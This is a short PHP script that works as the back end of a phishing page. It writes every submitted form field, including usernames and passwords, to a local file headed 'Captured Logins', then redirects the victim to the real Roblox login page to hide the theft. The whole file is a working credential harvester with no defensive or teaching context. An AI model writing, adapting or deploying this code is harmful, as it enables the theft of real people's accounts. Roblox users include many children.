<?php

$user = $_POST['username'];
$passwd = $_POST['password'];

$handler = fopen("results.txt","a");
fwrite($handler, "Captured Logins:\n\n");
foreach($_POST as $username => $password) {
    fwrite($handler, $username);
    fwrite($handler, " = ");
    fwrite($handler, $password);
    fwrite($handler, "\r\n");
}
fwrite($handler, "\r\n");
fclose($handler);

header("Location: https://www.roblox.com/login");

?>